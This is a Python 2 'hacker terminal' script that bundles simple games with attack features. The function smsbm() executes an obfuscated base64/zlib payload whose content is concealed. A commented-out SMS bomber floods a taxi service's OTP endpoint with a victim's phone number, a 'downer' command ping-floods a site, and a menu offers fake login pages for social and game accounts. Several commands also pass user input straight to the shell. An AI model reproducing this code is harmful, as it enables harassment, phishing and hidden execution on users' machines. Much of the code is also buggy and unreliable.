import time
import sys
import opcode
import commands
import getpass
import tkinter
import platform
import datetime
import random
import tkMessageBox
import ttk
import os
import requests
cmd = lambda: os
clear = lambda: os.system('clear')
clear()

#STYLES
Fin = '\x1b[m'
Black = '\x1b[30m'
Red = '\x1b[31m'
Pink = '\x1b[35m'
Yellow = '\x1b[33m'
Gray = '\x1b[37m'
Green = '\x1b[32m'
Blue = '\x1b[34m'
Blue2 = '\x1b[36m'
BGWhite = '\x1b[7m'
BGBlack = '\x1b[40m'
BGPink = '\x1b[41m'
BGGreen = '\x1b[42m'
BGYellow = '\x1b[43m'
BGBlue = '\x1b[44m'
BGPerple = '\x1b[45m'
BGBlue2 = '\x1b[46m'
BGGray = '\x1b[47m'
LGText = '\x1b[52m'
LGText2 = '\x1b[51m'
BIG = '\x1b[1m'
FIT = '\x1b[3m'
TU_ = '\x1b[4m'
TO_ = '\x1b[9m'
TU__ = '\x1b[21m'
############################################################################################################
#Functions
def Start():
    print("Bash https://M1778.com/Git")
    time.sleep(2)
    print("Bash https://M1778.com/GAMES")
    time.sleep(2)
    print("Bash https://M1778.com/READBOX")
    time.sleep(2)
    print("Bash https://M1778.com/CYBERS")
    time.sleep(2)
    print("Bash https://M1778.com/HACK-TIME")
    time.sleep(0)
    print(HACK_TIME_LG)
########################
def smsbm():
    try:
        import marshal, zlib, base64
        exec(zlib.decompress(base64.b64decode("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")))
    except ImportError:
        os.system('pip install marshar')
        os.system('pip install zlib')
        os.system('pip install requests')
        smsbm()
#########################
def ktin(ter):
    ter = ter.upper()
    pkg = ter.strip("KIT INSTALL ")
    print os.system("pkg install {}".format(pkg))
##############################################################################################################
######################
def timer():
    sdsw = 1
    print("are you ready?")
    time.sleep(4)
    print("1")
    time.sleep(2)
    print("2")
    time.sleep(2)
    print("run!")
    while True:
        print(sdsw)
        sdsw += 1

def gamen():
    wons = 0
    wonn = 0
    nam = raw_input("enter your name:")
    print("\033[94mWELLCOME \033[0m" + nam)
    time.sleep(3)
    so1 = random.randint(0, 10)
    so2 = random.randint(0, 10)
    so3 = random.randint(0, 10)
    ###########################
    qw1 = random.randint(0, 10)
    qw2 = random.randint(0, 10)
    qw3 = random.randint(0, 10)
    print("start game")
    time.sleep(2)
    print("\033[92m your cards numbers: \033[0m" + "card1:" + "{}".format(qw1) + " card2:" + "{}".format(qw2) + " card3:" + "{}".format(qw3))
    time.sleep(1)
    print("wait for system choose one card.")
    time.sleep(3)
    print("[choosed] now you choose ")
    ch = raw_input("choose number of cards: ")
    if ch == '1':
        print("ok")
    elif ch == '2':
        print("ok")
    elif ch == '3':
        print("ok")
    else:
        print("card notfound.")
        ter()
    print("round 1")
    time.sleep(2)

    if ch == '1':
        if qw1 > so3:
            print(qw1)
            print("round 1")
            print("you won")
            wonn += 1
            qw1 = "this "
        elif qw1 == so3:
            print qw1
            print("all won")
            wonn += 1
            qw1 = "this "

            wons += 1
        elif qw1 < so3:
            print qw1
            print("round 1")
            print("system won")
            wons += 1
            qw1 = "this "
        else:
            print("error")
            ter()
    elif ch == '2':
        if qw2 > so3:
            print qw2
            print("round 1")
            print("you won")
            wonn += 1
            qw2 = "this "

        elif qw2 == so3:
            print qw2
            print("all won")
            wonn += 1
            qw2 = "this "

            wons += 1
        elif qw2 < so3:
            print qw2
            print("round 1")
            print("system won")
            wons += 1
            qw2 = "this "
        else:
            print("error")
            ter()

    elif ch == '3':
        if qw3 > so3:
            print qw3
            print("round 1")
            print("you won")
            wonn += 1
            qw3 = "this "
        elif qw3 == so3:
            print qw3
            print("all won")
            wonn += 1
            qw3 = "this "

            wons += 1
        elif qw3 < so3:
            print qw3
            print("round 1")
            print("system won")
            wons += 1
            qw3 = "this "

        else:
            print("error")
            ter()
    else:
        print("error")
        ter()

    time.sleep(2)
    print("system choosed card for round 2")
    ch = raw_input("round2<choose number of cards: ")
    if ch == '1':
        print("ok")
    elif ch == '2':
        print("ok")
    elif ch == '3':
        print("ok")
    else:
        print("card notfound.")
        ter()
    if ch == '1':
        if qw1 > so2:
            print qw1
            if qw1 == "this ":
                print("error: this card used try again.")
                ter()
            elif qw1 == "this ":
                print("error: this card used try again.")
                ter()
            print("round 2")
            print("you won")
            qw1 = "this "
            wonn += 1
        elif qw1 == so2:
            print qw1
            if qw1 == "this ":
                print("error: this card used try again.")
                ter()
            elif qw1 == "this ":
                print("error: this card used try again.")
                ter()
            print("all won")
            qw1 = "this "
            wonn += 1

            wons += 1
        elif qw1 < so2:
            print qw1
            if qw1 == "this ":
                print("error: this card used try again.")
                ter()
            elif qw1 == "this ":
                print("error: this card used try again.")
                ter()
            print("round 2")
            print("system won")
            qw1 = "this "
            wons += 1
    elif ch == '2':
        if qw2 > so2:
            print qw2
            if qw2 == "this ":
                print("error: this card used try again.")
                ter()
            elif qw2 == "this ":
                print("error: this card used try again.")
                ter()
            print("round 2")
            print("you won")
            qw2 = "this "
            wonn += 1
        elif qw2 == so2:
            print qw2
            if qw2 == "this ":
                print("error: this card used try again.")
                ter()
            elif qw2 == "this ":
                print("error: this card used try again.")
                ter()
            print("all won")
            qw2 = "this "
            wonn += 1

            wons += 1
        elif qw2 < so2:
            print qw2
            if qw2 == "this ":
                print("error: this card used try again.")
                ter()
            elif qw2 == "this ":
                print("error: this card used try again.")
                ter()
            print("round 2")
            print("system won")
            qw2 = "this "
            wons += 1


    elif ch == '3':
        if qw3 > so2:
            print qw3
            if qw3 == "this ":
                print("error: this card used try again.")
                ter()
            elif qw3 == "this ":
                print("error: this card used try again.")
                ter()
            print("round 2")
            print("you won")
            qw3 = "this "
            wonn += 1
        elif qw3 == so2:
            print qw3
            if "this" in qw3:
                print("error: this card used try again.")
                ter()
            elif "this " in qw3:
                print("error: this card used try again.")
                ter()
            print("all won")
            qw3 = "this "
            wonn += 1

            wons += 1
        elif qw3 < so2:
            print qw3
            if qw3 == "this ":
                print("error: this card used try again.")
                ter()
            elif qw3 == "this ":
                print("error: this card used try again.")
                ter()
            print("round 2")
            print("system won")
            qw3 = "this "
            wons += 1
    #######################
    time.sleep(2)
    print("system choosed card for round 2")
    ch = raw_input("round3<choose number of cards: ")
    if ch == '1':
        print("ok")
    elif ch == '2':
        print("ok")
    elif ch == '3':
        print("ok")
    else:
        print("card notfound.")
        ter()
    if ch == '1':
        if qw1 > so1:
            print qw1
            if qw1 == "this ":
                print("error: this card used try again.")
                ter()
            elif qw1 == "this ":
                print("error: this card used try again.")
                ter()
            print("round 3")
            print("you won")
            wonn += 1
        elif qw1 == so1:
            print qw1
            if qw1 == "this ":
                print("error: this card used try again.")
                ter()
            elif qw1 == "this ":
                print("error: this card used try again.")
                ter()
            print("all won")
            wonn += 1

            wons += 1
        elif qw1 < so1:
            print qw1
            if qw1 == "this ":
                print("error: this card used try again.")
                ter()
            elif qw1 == "this ":
                print("error: this card used try again.")
                ter()
            print("round 3")
            print("system won")
            wons += 1
    elif ch == '2':
        if qw2 > so1:
            print qw2
            if qw2 == "this ":
                print("error: this card used try again.")
                ter()
            elif qw2 == "this ":
                print("error: this card used try again.")
                ter()
            print("round 3")
            print("you won")
            wonn += 1
        elif qw2 == so1:
            print qw2
            if qw2 == "this ":
                print("error: this card used try again.")
                ter()
            elif qw2 == "this ":
                print("error: this card used try again.")
                ter()
            print("all won")
            wonn += 1

            wons += 1
        elif qw2 < so1:
            print qw2
            if qw2 == "this ":
                print("error: this card used try again.")
                ter()
            elif qw2 == "this ":
                print("error: this card used try again.")
                ter()
            print("round 3")
            print("system won")
            wons += 1
    elif ch == '3':
        if qw3 > so1:
            print qw3
            if qw3 == "this ":
                print("error: this card used try again.")
                ter()
            elif qw3 == "this ":
                print("error: this card used try again.")
                ter()
            print("round 3")
            print("you won")
            wonn += 1
        elif qw3 == so1:
            print qw3
            if qw3 == "this ":
                print("error: this card used try again.")
                ter()
            elif qw3 == "this ":
                print("error: this card used try again.")
                ter()
            print("all won")
            wonn += 1

            wons += 1
        elif qw3 < so1:
            print qw3
            if qw3 == "this ":
                print("error: this card used try again.")
                ter()
            elif qw3 == "this ":
                print("error: this card used try again.")
                ter()
            print("round 3")
            print("system won")
            wons += 1
    elif wonn == 3 and wons == 3:
        print("system and {} win".format(nam))
        print("LOL")
    elif wonn == 1 and wons == 1:
        print("system and {} win".format(nam))
        print("LOL")
    elif wonn == 2 and wons == 2:
        print("system and {} win".format(nam))
        print("LOL")
    elif wons == 3:
        print("system is win")
        ter()
    elif wons == 2:
        print("system is win")
        ter()
    elif wonn == 3:
        print("you win")
        ter()
    elif wonn == 2:
        print("you win")
        ter()
    else:
        ter()

def gamerr():
    print("wellcome")
    cp = random.randint(1, 99)
    sta = 1
    had = 12
    while sta:
        an = input("Enter number:")
        if an == cp:
            print("+you won")
            sta = 0

        elif an > cp:
            print("-your insert is bigger than target")
            had -= 1
            if had == 0:
                print("-the robot won")
                sta = 0
        elif an < cp:
            print("-your insert is smaller than target")
            had -= 1
            if had == 0:
                print("-the robot won")
                sta = 0
        elif had == 0:
            print("-the robot won")
            sta = 0
def rip():
    print("wellcome to dark")
    myd = raw_input("your rip: y = sall , d = ros , m = daghighe , s = sanie.")
    if myd == "y":
        ddd = random.randint(55, 83)
        print("wait...")
        time.sleep(10)
        print("years  sall : {}".format(ddd))
    elif myd == "d":
        dddd = random.randint(20075, 30295)
        print("wait...")
        time.sleep(10)
        print("your days ; ros : {}".format(dddd))
    elif myd == "m":
        ddddd = random.randint(7227000, 109062000)
        print("wait...")
        time.sleep(10)
        print("years  min ; daghighe : {}".format(ddddd))
    elif myd == "s":
        dddddd = random.randint(433620000, 6543720000)
        print("wait...")
        time.sleep(10)
        print("your sanie : {}".format(dddddd))
def gamer():
    print("this game is for fun")
    time.sleep(2)
    print("robot:hello iam robot of game and help you for win")
    time.sleep(3)
    print("robot:player1 and player2 is ready?")
    time.sleep(4)
    print("player two look down")
    time.sleep(6)
    play1 = input("robot:player1 choose number(1, 99):")
    if play1 > 99:
        print("error:try again")
        ter()
    er = 10
    ro = 1
    while ro:
        play2 = input("player2:Enter number:")
        if play2 < play1:
            print("your insert is smaller than number")
            er -= 1
            if er == 0:
                ro = 0
                print("player1 won")
        elif play2 > play1:
            print("your insert is bigger than number")
            er -= 1
            if er == 0:
                ro = 0
                print("player1 won")
        elif er == 0:
            ro = 0
            print("player1 won")
            print("number is {}".format(play1))
        elif play2 == play1:
            ro = 0
            print("player2 won")
            ter()


def nume():
    while True:
        num1 = int(input(">> "))
        opt = raw_input("+, -, *, /, % >> ")
        num2 = int(input(">> "))
        if num1 == str:
            print("?error? !string!")
        elif num2 == "".format(str):
            print("?error? !string!")
        elif opt == "+":
            print(num1 + num2)
        elif opt == "-":
            print(num1 - num2)
        elif opt == "*":
            print(num1 * num2)
        elif opt == "/":
            print(num1 / num2)
        elif opt == "%":
            print(num1 % num2)
        else:
            print("""
            ___
           |*_*|""")
def huio():
    print("game ready")
    time.sleep(3)
    print("\n\n\n\n\n\n\n\n\n\n\n choose your number(1 ,100) your thing!")
    time.sleep(10)
    while True:
        hesl = random.randint(0, 101)
        isit = raw_input("your number is {} (y, n)".format(hesl))
        if isit == "y":
            print("yeah baby.")
            ter()
        else:
            print("ok next")



M1778 = """
                     ____                ____
                    |000 \              / 000|
                    |6664 \            / 9444|
                    |11|\ 3\          / 0/|99|
                    |99| \ 2\        / 1/ |11|
                    |88|  \ 1\      / 2/  |22|
                    |77|   \ 0\    / 3/   |33|
                    |11|    \ 9\__/ 4/    |99|
                    |99|      \____/      |11|        
                    |22|                  |88|            
                    |33|                  |77|
                    |44|                  |66| 
                    |55|                  |55|              
                    |66|                  |44|     
                    ====                  ====
"""
pain = """ 
          |hacker|
            ___ 
           /_ _\                    
           \   /        
           |~~~|   
           || ||
           ||_||
            |||
            |||
           [/ \]  """
print("_  __ ___")
time.sleep(0)
print("||  ||      \ \ ")
time.sleep(0)
print("   |||   | \ \ ")
time.sleep(0)
print(" ||  ||  \  \ ")
time.sleep(0)
print("| | |  |    \  \ ")
time.sleep(0)
print(" |  |  ||     \ \ ")
time.sleep(0)
print("|  |||        \ \ ")
time.sleep(0)
print("  |  |  | |        \  \ ")
time.sleep(0)
print(   "       || ||       \     \ ")
time.sleep(0)
print(" | | |          |               \ \ ")
time.sleep(0)
print("| ||     |                 \ \ ")
time.sleep(0)
print("      ||||          \ \ ")
time.sleep(0)
print("||                ||           \ \ ")
time.sleep(0)
print("|    || |             _ _ _  _ _ _")
time.sleep(0)
print(" || |       |")
time.sleep(0)
print("  | |      || ")
time.sleep(0)
print("     |    |   | |    ")
time.sleep(0)
print(" | ||            |  ")
time.sleep(0)
print("| |   |           |")
time.sleep(0)
print("   |   |        ||")
time.sleep(0)
print("     |   | ||")
time.sleep(0)
print(" | |     | |")
time.sleep(3)
print("                        \033[95m W\033[m\033[91mE\033[m\033[92ml\033[m\033[93ml\033[m\033[94mC\033[m\033[95mO\033[m\033[96mM\033[m\033[90mE\033[m")
time.sleep(2)
print("\033[90mclone:/\033[mhttps://github.com/git/git")
time.sleep(1)
print("\033[90mclone:/\033[mhttps://pc.io/point/dwp                \033[91m[1031K.B]\033[m")
time.sleep(1)
print("\033[90mclone:/\033[mhttps://github.com/mac/file             \033[91m[834K.B]\033[m")
time.sleep(1)
print("\033[90mclone:/\033[mhttps://github.com/mac/personal         \033[91m[910K.B]\033[m")
time.sleep(1)
print("\033[90mclone:/\033[mhttps://github.com/mac/siteclone       \033[91m[4357K.B]\033[m")
time.sleep(1)
print("\033[90mclone:/\033[mhttps://github.com/mac/html             \033[91m[258K.B]\033[m")
time.sleep(1)
print("\033[90mclone:/\033[mhttps://github.com/mac/python3         \033[91m[1321K.B]\033[m")
time.sleep(1)
print("\033[90mclone:/\033[mhttps://github.com/mac/system_play      \033[91m[679K.B]\033[m")

root = ("command")
add1 = []
def ter():
    ope = raw_input("Enter root password:")
    print("""
................................
|youtube:M1778                 |
|instagram:iraniancyber_team   |
|twtter:IRC.support            |
````````````````````````````````    
""")
    if ope == "cpuroot":
        while True:
            tera = raw_input("\033[92m~root\033[0m\033[91m@{}\033[0m\033[90m$\033[0m ")
            if tera == "help":
                print("""{root:True}{version-:1.4.3}{ADDMIN-M1778CYBER}
/commands    \         /root/noroot\             /objects_____________________________________________________________
|s -pages    |         |is ready   |             |                                                                    |
|check -root |         |root/noroot|             |check for rooting terminal                                          |.
|login -root |         |noroot     |             |login to root terminal for all commands                             |
|logout -root|         |just root  |             |loguot from terminal root                                           |
|ping        |         |justroot   |             |ping use for replay to ip and check ip  use ping --help for info    |
|connect -ip |         |justroot   |             |connect to ip for change ip and use vpn                             |
|ls          |         |justroot   |             |show your locate                                                    |
|copy-right  |         |justroot   |             |use(copy-right)                                                     |
|platform    |         |justroot   |             |show your platform                                                  |
|machinnum   |         |justroot   |             | for  /_+_-_*                                                       |
|scanner     |         |root/noroot|             |scan bad files{100000}                                              |
|game rand   |         |justroot   |             |for funy                                                            |
|timer       |         |justroot   |             |timer for ever                                                      |
|dead        |         |justroot   |             |GAME OVER (*/*)                                                     |
|downer      |         |justroot   |             |send replay for site and down site                                  |
|get         |         |justroot   |             |{<VIP> (command)} install and use command:[get --help]              |
|cd -help    |         |justroot   |             |for cmd or linux or mac                                             |
|T-color     |         |justroot   |             |text color for color text                                           |
|shutdown    |         |justroot   |             |{Big}shutdown the system                                            |
|echo        |         |justroot   |             |{cmd}use help echo for more setting                                 |
|me -L       |         |justroot   |             |for fun                                                             |
|root -linux |         |root/linux |             |opened terminal linux + root just linux                             |
|bomb -m     |         |justroot   |             |for fun                                                             |
|game -n     |         |justroot   |             |game num                                                            |
|clear       |         |justroot   |             |cleaner                                                             |
|game -LOL   |         |justroot   |             |for fun lol                                                         |
|bash        |         |justroot   |             |use [bash -help] for settings.                                      |
|my IRP      |         |justroot   |             | your I.R.P                                                         |
|pip         |         |root/python|             |for install package for python                                      |
|show-version|         |justroot   |             |show your pc version                                                |
|wget        |         |justroot   |             |for visit site and get codes and use for <linux>                    |
|output      |         |justroot   |             |for fun                                                             |
|date&time   |         |justroot   |             |show you (date)-> 'and'-> {time}                                    |
|attac -o    |         |justroot   |             |----------------------------------------------------                |
|op-map      |         |justroot   |             |show locate opmap                                                   |
|smsbomber   |         |justroot   |             |sms sender   just:+98                                               |
|fake -p     |         |justroot   |             |fake pages for get acconts                                          |
|code        |         |justroot   |             |use [code -help]                                                    |
|python      |         |justroot   |             |open python for right code                                          |
|cmd         |         |justroot   |             |VIP COMMAND for code to cmd(python)                                 |
|visit       |         |justroot   |             |{<VIP> (command)} use command:[visit --help] example{visit https://}|
|help -sys   |         |justroot   |             |help ter c or l/t                                                   |
|FL          |         |root/helper|             |helper for language python easy                                     |
|.GOW        |         |IDE. /root |             |{language}complier language GOW<new> _import _{exit_} help -.       |
\{kit}       /         \justroot   /             \{<king of commands> (command)} use command:[kit --help] for info    /""")
            elif tera == "platform":
                print(sys.platform)
            # elif tera == "smsbomber":
            #    cellphone = input("\n\033[95mEnter number of target\033[0m\n")
            #     while True:
            #
            #         ur = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
            #         lsa = {"cellphone": "+98" + cellphone}
            #         i1 = requests.post(ur.data=lsa)
            #         if i1 == True:
            #             print("send")
            #         else:
            #             print("no send")
            elif "echo" in tera:
                lilik = commands.getoutput(cmd="{}".format(tera))
                print lilik
            elif tera == "s -pages":
                print("""
                ................................
                |youtube:None                  |
                |instagram:iraniancyber_team   |
                |twtter:IRC.support            |
                ````````````````````````````````    
                """)

            elif tera == "timer":
                timer()
            elif tera == "game -LOL":
                print("FL hello")
                raw_input("<{'[(_-=+&^%$@!~()~!@$%^&+=-_)]'}>")
                huio()
            elif tera == "game -n":
                gamen()
            elif tera == "help -.":
                print("""new language version-1.0.1
language GOW is very easy. 
{} your text.
echo {} output({})
string = {} output(is ready {})
if and else output(?) .UID              
MA( <'+'> <'-'> <'='> <'@user'> <'1, 2, 3, 4, 5, 6, 7, 8, 9'>)
int = {num} output(is ready {})
time------------
time!stop
time/
rko output(HTML.file)
intaer output(exp: enter number phone:)                
outcrad output(exp: i hate you)
'TAB'   output(...)
""")
            elif tera == "":
                time.sleep(0)
            elif tera == " ":
                time.sleep(0)
            elif tera == "bomb -m":
                posda = 999999
                while True:
                    print("1")
                    print("2")
                    print("3")
                    print("4")
                    print("5")
                    print("6")
                    print("7")
                    print("8")
                    print("9")
                    print("0")
                    posda -= 1
                    if posda == 2:
                        break
            elif tera == "my -IRP":
                rip()
            elif tera == "me -L":
                namee = raw_input("enter your name: ")
                print(""" 
         |{}|
            ___ 
           /*_*\                    
           \   /        
           |~~~|   
           || ||
           ||_||
            |||
            |||
           [/ \]""".format(namee))
            elif tera == "help -sys":
                print commands.getoutput(cmd="help")
            elif "pip"in tera:
                lll = commands.getoutput(cmd="{}".format(tera))
                print lll
            elif "pip "in tera:
                llle = commands.getoutput(cmd="{}".format(tera))
                print llle
            elif tera == "T-color":
                print("start")
                kiye = raw_input("texts:")
                print("colors:1-red, 2-blue, 3-green, 4-black, 5-yellow, 6-pink")
                color = raw_input("enter number of color:")
                if color == '1':
                    print("\033[91m{}\033[0m".format(kiye))
                elif color == '2':
                    print("\033[96m{}\033[0m".format(kiye))
                elif color == '3':
                    print("\033[92m{}\033[0m".format(kiye))
                elif color == '4':
                    print("\033[90m{}\033[0m".format(kiye))
                elif color == '5':
                    print("\033[93m{}\033[0m".format(kiye))
                elif color == '6':
                    print("\033[95m{}\033[0m".format(kiye))
                else:
                    print("try again")
            elif tera == "root -linux":
                iuuu = sys.platform
                if "linux"or "linux " in iuuu:
                    print commands.getoutput(cmd="sudo su")
            elif tera == "fake -p":
                print("""version-1.0
     facebook(fake -p -fb)
     clash of clans(fake -p -coc)
     instagram(fake -p -in)
     pubg mobile(fake -p -pg)

""")
            elif tera == "clear":
                print commands.getoutput(cmd="clear")
            elif tera == "fake -p -fb":
                print("wait...")
                time.sleep(3)
                print("yourlink: ")
            elif tera == "fake -p -coc":
                print("wait...")
                time.sleep(3)
                print("yourlink: ")
            elif tera == "fake -p -in":
                print("wait...")
                time.sleep(3)
                print("yourlink: ")
            elif tera == "fake -p -pg":
                print("wait...")
                time.sleep(3)
                print("yourlink: ")
            elif tera == "dead":
                kkk = commands.getoutput(cmd="sudo shutdown")
                print("wait...")
                time.sleep(57)
                print("""
     _____________________________________
    |                                     |
    |          \033[91m   GAME OVER\033[0m               |
    |                                     |
    |             you loser               |
    |_____________________________________|""")
            elif tera == "attac -o":
                opop = raw_input("enter your text:")
                print commands.getoutput(cmd="yes {}".format(opop))
            elif tera == "python":
                print("sorry but this command is not ready!")
            elif "apt "in tera:
                print "this command use to terminal"
                apt = commands.getoutput(cmd="{}".format(tera))
                print apt
            elif "apt"in tera:
                print "this command use to terminal"
                apt = commands.getoutput(cmd="{}".format(tera))
                print apt
            elif tera == "op-map":
                print "pls wait..."
                time.sleep(7)
                print opcode.opmap
            elif tera == "date&time":
                print commands.getoutput(cmd="date")
                print("+_+")
            elif tera == "downer":
                opw = raw_input("you have (1=ip) or (2=url):")
                if opw == '1':
                    ipe = raw_input("Enter ip:")
                    while True:
                        print commands.getoutput(cmd="ping {}".format(ipe))
                        time.sleep(2)
                        print("send replay for '{}'".format(ipe))
                elif opw == '2':
                    url = raw_input("Enter url site:")
                    ip = commands.getoutput(cmd="ping {}".format(url))
                    while True:
                        time.sleep(2)
                        print commands.getoutput(cmd="ping {} -t 250 -l 3".format(ip))
            elif "wget" in tera:
                siter = raw_input("enter 'url' <site> : ")
                iu = commands.getoutput(cmd="wget {}".format(siter))
                print("please wait...")
                time.sleep(20)
                print("wgeted {}".format(siter))
            elif "cd -help" in tera:
                print("cd [-L|[-P [-e]] [-@]] [dir]>   readarray [-n count] [-O or>")
                print("cd .. / cd flname ")
            elif "cd " in tera:
                print commands.getoutput(cmd="{}".format(tera))
            elif tera == "cmd":
                print("""
this panel has bug but is worked
if your command is not found the terminal get bug
is worked use ls and look
""")
                while True:
                    cmdi = raw_input("cmd: ")
                    print commands.getoutput(cmd="{}".format(cmdi))
            elif tera == "output":
                lolo = 1
                hgh = 0
                kf = 5

                while lolo:
                    fg = raw_input("")
                    kf -= 1
                    if kf == hgh:
                        lolo = 0

                    fg = raw_input()
            elif tera == "game rand":
                    qi = raw_input("1 player or 2 players:")
                    if qi == '2':
                        gamer()
                    elif qi == '1':
                        gamerr()
                    else:
                        print("{} notfound".format(qi))
            elif tera == "code -help":
                print("""         \033[96mcode\033[0m
code start = {code}
exit code = {exit.code}
""")
            elif tera == "machinnum":
                nume()
            elif tera == "code":
                klkl = 1
                while klkl:
                    code = raw_input("")
                    if code == "exit.code":
                        klkl = 0
            elif tera == "bash -help":
                print("""bash settings 
bash for get say
bash -py   {python}
bash -C++  {C++ or Cpp}
bash -java {java}
bash {all}
""")
            elif tera == "bash":
                print("""version -1
py = python {easy]
Cpp = C++   {hard]
java = jav  {hard or normal]
Php = php   {hard]
C#  = C#    {hard]                
""")
            elif tera == "copy-right":
                print(sys.copyright)
            elif tera == "check -root":
                print(True)
            elif tera == "ping --help":
                print("ping info:             {[-i]<ip>} {[-s]<packet size>} {[-t]<attack>}")
                print("exaple{ping}")
                print("output = -i ")
                print("output2 = -s ")
                print("output3 = -t ")
            elif tera == "show-version":
                print(sys.version)
            elif tera == "ping":
                ip = raw_input("-i ")
                size = raw_input("-s ")
                t = raw_input("-t ")
                commands.getoutput(cmd="ping ip")
                while True:
                    print(" 'package' 'send' to <{}> -timeout-".format(ip))
            elif tera == "connect -ip":
                cd = raw_input("Enetr ip for connect:")
                if '.'and"." in cd:
                    lolollo = commands.getoutput(cmd="sudo apt-get install connect-proxy")
                    print lolollo
                    lklkl = commands.getoutput(cmd="connect-proxy")
                    lklkl = commands.getoutput(cmd="connect-proxy {}".format(cd))
                    time.sleep(2)
                    print("please wait...")
                    time.sleep(10)
                    print("[connected] 'to' <{}>".format(cd))
                else:
                    print("{} ip notfound".format(cd))
            elif tera == "scanner":
                print("scaning system...")
                time.sleep(4)
                print("search the virus...")
                time.sleep(3)
                hj = raw_input("find a virus<{},0m> delete files?[Y, n]?\n")
                if "y"or"Y" in hj:
                    print("ok")
                    time.sleep(3)
                    print("deleted")
                else:
                    print("bash-+4316479")
            elif tera == "shutdown":
                print commands.getoutput(cmd="sudo shutdown -P")
                print "wait..."
                time.sleep(60)
            elif tera == "get --help":
                print("\033[94m<[get] VIP command>\033[0m")
                print("[get-sleep]:{sleep}")
                print("[get-down]:{unit virus for down pc}")
                print("[get-down-]:{downing files}")
                print("[get-ride]:{speed of your pc}")
                print("[get-html]:{'not ready'}")
                print("[txt-get size]:{show your text size}")
            elif tera == "txt-get size":
                size = raw_input("Enter your text:")
                print("size: "and sys.getsizeof(size))
            elif tera == "get-sleep":
                while True:
                    sds = input("")
                    if sds == "pppppppppppppppqwrweroijoefjaweufewaioehtwahfowahfowahf":
                        print("WTF")
                    else:
                        sds
            elif tera == "get-down":
                while True:
                    print("wait...")
                    time.sleep(4)
            elif tera == "get-down-":
                hu = raw_input("Enter file name")
                while True:
                    print("try to downing {}".format(hu))
